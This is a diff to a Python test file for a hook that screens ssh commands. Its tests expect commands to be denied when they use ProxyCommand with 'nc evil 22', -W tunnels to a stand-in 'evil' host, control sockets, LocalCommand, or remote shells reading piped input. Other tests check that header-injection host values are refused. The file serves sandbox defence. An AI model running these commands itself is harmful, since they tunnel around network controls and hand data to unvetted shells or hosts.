@@ -39,6 +39,7 @@ VALUE = "ssh-route-value 'q\" $(no) \\z"
 
 
 def tearDownModule():  # noqa: N802 - unittest hook
+    _reset()        # the vault home is shared: a later module counts its own entries
     _hygiene.assert_pristine()
     alive = _hygiene.wait_for_no_serving_child()
     if alive:
@@ -102,14 +103,33 @@ class RouteDecisionTests(unittest.TestCase):
             (f"printf '%s' {r} | ssh aux01", "shell code"),
             (f"printf '%s' {r} | ssh aux01 bash", "shell code"),
             (f"printf '%s' {r} | ssh aux01 'sh -s'", "shell code"),
-            (f"printf '%s' {r} | ssh aux01 exec cat", "shell code"),
-            (f"printf '%s' {r} | ssh -J bastion aux01 cat", "proxy or jump"),
-            (f"printf '%s' {r} | ssh -o ProxyCommand='nc evil 22' aux01 cat", "proxy or jump"),
-            (f"printf '%s' {r} | ssh aux01 -o 'ProxyCommand=nc evil 22' cat", "proxy or jump"),
-            (f"printf '%s' {r} | ssh -oProxyJump=bastion aux01 cat", "proxy or jump"),
-            (f"printf '%s' {r} | ssh -W evil:22 aux01", "proxy or jump"),
-            (f"printf '%s' {r} | ssh -o ControlPath=~/.ssh/cm aux01 cat", "proxy or jump"),
-            (f"printf '%s' {r} | ssh -S ~/.ssh/cm aux01 cat", "proxy or jump"),
+            (f"printf '%s' {r} | ssh -J bastion aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -o ProxyCommand='nc evil 22' aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh aux01 -o 'ProxyCommand=nc evil 22' cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -oProxyJump=bastion aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -W evil:22 aux01", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -o ControlPath=~/.ssh/cm aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -S ~/.ssh/cm aux01 cat", "own proxy, jump host"),
+            # edge-case review, 2026-09-27: options after the host, the destination, local commands
+            (f"printf '%s' {r} | ssh aux01 -S /tmp/mux.sock 'grep -F -f - x'", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh aux01 -M cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -o HostName=other.example.com aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -F /tmp/cfg aux01 cat", "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -o PermitLocalCommand=yes -o 'LocalCommand=tee /tmp/x' aux01 cat",
+             "own proxy, jump host"),
+            (f"printf '%s' {r} | ssh -o 'KnownHostsCommand=/bin/x' aux01 cat", "own proxy, jump host"),
+            # the remote side reads its program from stdin, passes the value on, or encodes it
+            (f"printf '%s' {r} | ssh aux01 sudo bash", "shell code"),
+            (f"printf '%s' {r} | ssh aux01 python3", "its program"),
+            (f"printf '%s' {r} | ssh aux01 'env sh'", "shell code"),
+            (f"printf '%s' {r} | ssh aux01 'cd /tmp && bash'", "shell code"),
+            (f"printf '%s' {r} | ssh aux01 'grep x f; cat | sh'", "shell code"),
+            (f"printf '%s' {r} | ssh aux01 'xargs -I{{}} sh -c {{}}'", "hand the value to sh"),
+            (f"printf '%s' {r} | ssh aux01 '$SHELL'", "variable"),
+            (f"printf '%s' {r} | ssh aux01 base64", "encoded"),
+            (f"printf '%s' {r} | ssh aux01 'xxd -p'", "encoded"),
+            (f"printf '%s' {r} | ssh aux01 'ssh other cat'", "another shell or host"),
+            (f"ssh aux01 'grep -F -f - x' <<< {r}", "here-string"),
             (f"printf '%s' {r} > /tmp/x; ssh aux01 cat", "stdin"),
             (f"printf '%s' {r} | ssh a cat | ssh b cat", "only one ssh"),
             (f"echo {r}; printf '%s' x | ssh aux01 cat", "feed ssh"),
@@ -131,13 +151,23 @@ class RouteDecisionTests(unittest.TestCase):
             self.assertEqual(_hso(_pre(cmd))["permissionDecision"], "deny")
 
     def test_wrappers_and_options_before_the_host_keep_the_route(self):
-        for cmd in (f"printf '%s' {self.ref} | sudo -u ops ssh -p 2222 -i ~/.ssh/k aux01 'grep -F -f - x'",
+        for cmd in (f"printf '%s' {self.ref} | ssh aux01 exec cat",
+                    f"printf '%s' {self.ref} | ssh aux01 'grep -F -f - /var/log/proxyjump.log'",
+                    f"printf '%s' {self.ref} | ssh aux01 'perl -ne print'",
+                    f"printf '%s' {self.ref} | ssh aux01 \"sh -c 'grep -F -f - x'\"",
+                    f"printf '%s' {self.ref} | env MSG='a ssh b' ssh aux01 'grep -F -f - x'",
+                    f"printf '%s' {self.ref} | env PATH=/opt/ssh:/usr/bin ssh aux01 'grep -F -f - x'",
+                    f"printf '%s' {self.ref} | sudo -u ops ssh -p 2222 -i ~/.ssh/k aux01 'grep -F -f - x'",
                     f"printf '%s' {self.ref} | /usr/bin/ssh -tt -l ops aux01 'cat > /tmp/f'",
                     f"printf '%s' {self.ref} | tr a-z A-Z | ssh aux01 -- 'grep -w -F -f - x'"):
             with self.subTest(cmd=cmd):
                 out = _hso(_pre(cmd))
                 self.assertEqual(out["permissionDecision"], "ask", out)
-                self.assertRegex(out["updatedInput"]["command"], r"ssh -o ControlMaster=no -o ControlPath=none -o 'ProxyCommand=")
+                new = out["updatedInput"]["command"]
+                # the options follow the ssh command word, never a word inside quotes or an assignment
+                self.assertRegex(new, r"[\s/]ssh -o ControlMaster=no -o ControlPath=none -o 'ProxyCommand=")
+                self.assertNotIn("a ssh -o", new)
+                self.assertNotIn("/opt/ssh -o", new)
 
 
 @unittest.skipIf(BASH is None or os.name == "nt", "needs bash on POSIX")
@@ -196,6 +226,21 @@ class RewrittenCommandTests(unittest.TestCase):
 hooks.__dict__.setdefault("_sandbox_guard_real", hooks._sandbox_guard)
 
 
+@unittest.skipIf(BASH is None or os.name == "nt", "needs bash on POSIX")
+class GuardProbeTests(unittest.TestCase):
+    """The real guard: without the sandbox runtime's proxy it stops before any connection."""
+
+    def test_a_proxy_of_another_form_stops_the_guard_without_a_connection(self):
+        guard = hooks._sandbox_guard()
+        for proxy in ("", "http://cntlm:p@localhost:3128", "http://srt.x:p@proxy.example.org:8080", "http://localhost:1"):
+            with self.subTest(proxy=proxy):
+                env = {**os.environ, "SANDBOX_RUNTIME": "1", "HTTPS_PROXY": proxy}
+                r = subprocess.run([BASH, "-c", guard + "; echo reached"], capture_output=True, text=True, env=env,
+                                   timeout=30)
+                self.assertEqual(r.returncode, 97, r.stderr)
+                self.assertNotIn("reached", r.stdout)
+
+
 class _Proxy(threading.Thread):
     """A local CONNECT proxy: answers `status`, records the request, echoes the tunnel."""
 
@@ -248,13 +293,14 @@ class ProxyHelperTests(unittest.TestCase):
     def test_a_refusal_ends_with_exit_1_and_names_the_status(self):
         p = _Proxy("403 Forbidden")
         p.start()
-        r = self.run_helper(f"http://u:p@127.0.0.1:{p.port}")
+        r = self.run_helper(f"http://srt.u:p@127.0.0.1:{p.port}")
         p.join(5)
         self.assertEqual(r.returncode, 1)
         self.assertIn(b"refused aux01:22: HTTP/1.1 403 Forbidden", r.stderr)
 
     def test_a_proxy_that_is_not_on_this_machine_never_gets_the_login(self):
-        for url in ("http://u:p@proxy.example.org:3128", "https://u:p@localhost:3128", "", "http://u:p@localhost"):
+        for url in ("http://srt.u:p@proxy.example.org:3128", "https://srt.u:p@localhost:3128", "",
+                    "http://srt.u:p@localhost", "http://cntlm:p@localhost:3128", "http://localhost:3128"):
             with self.subTest(url=url):
                 r = self.run_helper(url)
                 self.assertNotEqual(r.returncode, 0)
@@ -263,7 +309,7 @@ class ProxyHelperTests(unittest.TestCase):
     def test_a_host_that_could_inject_a_header_is_refused(self):
         for host in ("aux01\r\nX: y", "a b", "user@aux01", ""):
             with self.subTest(host=host):
-                r = self.run_helper("http://u:p@localhost:1", host=host)
+                r = self.run_helper("http://srt.u:p@localhost:1", host=host)
                 self.assertEqual(r.returncode, 2)
 
 
